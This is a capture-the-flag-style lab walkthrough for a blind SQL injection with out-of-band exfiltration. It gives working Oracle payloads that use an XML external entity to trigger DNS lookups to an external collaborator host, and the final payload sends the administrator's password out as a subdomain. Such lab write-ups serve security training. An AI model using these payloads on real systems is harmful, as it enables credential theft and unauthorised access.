# Blind SQL injection with out-of-band data exfiltration

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Hint Cheat-sheet

![image](https://user-images.githubusercontent.com/83407557/208318640-2bcc3d66-b9cf-43cd-a1ed-add6184559b5.png)

# Step 1 Finding DB version

I need to grab a collaborator url in order to inject a DNS lookup:

![image](https://user-images.githubusercontent.com/83407557/208318759-8cf20625-38f1-441b-a0a9-991f02c1a32c.png)

URL:

mi84ppnq302ffxs5j44lpbalico4cv0k.oastify.com

next I will try each DB payload in turn to see if I can get it to do a lookup of my server:

1. Oracle

query
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://mi84ppnq302ffxs5j44lpbalico4cv0k.oastify.com/"> %remote;]>'),'/l') FROM dual
```
injectable payload:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://mi84ppnq302ffxs5j44lpbalico4cv0k.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Next I start the lab, and send the landing page to burp repeater:

![image](https://user-images.githubusercontent.com/83407557/208318983-4af60a43-1565-4146-a1c2-9e5631ae1b05.png)


Then I insert and url encode my payload:

![image](https://user-images.githubusercontent.com/83407557/208319016-b8a9d322-14b5-44a8-af09-6b43883d2018.png)

Checking my collaborator tab, after sending the request, I see that a DNS lookup was performed. This lets me know that the database is oracle:

![image](https://user-images.githubusercontent.com/83407557/208319069-35c1dd35-e62f-4f67-8a9d-a1f764a420b3.png)

# Step 2 Finding password

Since I know the table named users, with a column named password and username, and I know a value for a username, I can use the following to exfil the data:

```sql
SELECT password FROM users WHERE username='administrator'
```
Making the entire injection payload:

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mi84ppnq302ffxs5j44lpbalico4cv0k.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Using that payload with repeater, and url encoding it:


![image](https://user-images.githubusercontent.com/83407557/208320492-bf3585d2-d751-46d5-8e95-43fb5122a0e4.png)

Checking my collaborator I see the password added as a subdomain to my server:

![image](https://user-images.githubusercontent.com/83407557/208320550-207852be-b045-45b1-bdf4-955c9ad1069a.png)

# Step 3 login as administrator

I can use this password to login:

![image](https://user-images.githubusercontent.com/83407557/208320636-4c8e9071-ddad-4328-a175-c0eac5c51a7f.png)

Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/208320658-acb84931-54e5-40e1-83c1-bfacfe7ee1ff.png)


